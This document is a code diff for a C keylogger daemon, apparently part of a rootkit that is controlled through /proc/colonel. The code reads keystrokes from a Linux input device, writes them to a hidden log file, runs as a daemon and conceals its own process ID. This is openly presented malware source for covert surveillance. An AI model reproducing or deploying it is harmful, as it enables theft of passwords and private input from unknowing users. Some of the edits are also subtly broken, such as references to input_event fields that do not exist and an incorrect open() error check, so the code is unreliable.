@@ -81,10 +81,10 @@ int is_root(void) {
 }
 
 int system_timestamp(void) {
-	struct utsname unameData;							/* struct provides system information */
-	uname(&unameData);								/* provides system information */
+	struct utsname unameData;					/* struct provides system information */
+	uname(&unameData);						/* provides system information */
 	time_t curtime;
-	time(&curtime);									/* set the current time */
+	time(&curtime);							/* set the current time */
 	fprintf(evlog, "\n\n%s", ctime(&curtime));		        /* timestamp */
 	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	                /* system data */
 		unameData.nodename, unameData.version,
@@ -97,31 +97,30 @@ int system_timestamp(void) {
 
 int key_listen(void) {
 	int control_file;
-	int input_device;					/* will read from device event file */
-	char listening = 0;					/* toggles keylogger on/off */
-	char *cmd;						/* stores commands */
-	char *kl = "keylogger: 1";				/* defines what keylogger is listening for on /proc/colonel */
-	char *toggle;						/* listens for keylogger cmd */
-	struct input_event ev;					/* using input_event so we know what we're reading */
+	int input_device;						/* will read from device event file */
+	char listening = 0;						/* toggles keylogger on/off */
+	char cmd[1024];							/* stores commands */
+	char *kl = "keylogger: 1";					/* defines what keylogger is listening for on /proc/colonel */
+	char *toggle;							/* listens for keylogger cmd */
+	struct input_event ev;						/* using input_event so we know what we're reading */
 	time_t curtime;
-	time(&curtime);						/* set the current time */
+	time(&curtime);							/* set the current time */
 	
-	input_device = open("/dev/input/event2", O_RDONLY);     /* key event file */
+	input_device = open("/dev/input/event2", O_RDONLY);     	/* key event file */
 	
 	while(1) {				
 		fflush(error_log);
-		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
-		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
+		read(input_device, &ev, sizeof(struct input_event));    /* read from /dev/input/eventX */
+		control_file = open("/proc/colonel", O_RDONLY);         /* read from /proc/colonel */
 		if (!control_file) {
 			fprintf(error_log, "ERROR: Could not open control_file -- %s.", ctime(&curtime));
 			exit(1);
 		}
-		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
-		//toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
-		if ((0 == listening) && (toggle)) {
+		read(control_file, &cmd, sizeof(cmd));		        /* read from /proc/colonel */
+		toggle = strstr(cmd, kl);			        /* looks for change in /proc/colonel */
+		if ((0 == listening) && (toggle != NULL)) {
 			listening = !listening;
-        		evlog = fopen("./col_log/evlog.txt", "a+");          		/* key log */
-            		printf("evlog: ", evlog);
+        		evlog = fopen("./col_log/evlog.txt", "a+"); 	/* key log */
 			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 		exit(1);
@@ -130,9 +129,8 @@ int key_listen(void) {
 			close(control_file);
 			continue;
 
-		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing (ev.type = 1) and keylogger is on */
-            		fprintf(evlog, "%i,%i-", ev.code, ev.value);         		/* grabs keyboard input -- 
-											 * ev.code = keycode, ev.value = key state (0: key up, 1: key down) */
+		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing and keylogger is on */
+            		fprintf(evlog, "%i,%i-", ev.keycode, ev.keystate);     		/* grabs keyboard input */
 			fflush(evlog);
 			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
 			if (NULL == toggle) {
@@ -149,14 +147,10 @@ int key_listen(void) {
 }
 
 int main(void) {
-	int input_device;								/* will read from device event file */
-	
-	//daemonize();
+	daemonize();
 	setup_dirs();
 
 	error_log = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
-	input_device = open("/dev/input/event2", O_RDONLY);			        /* key event file */
-
 	hide_pid();
 	is_root();
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
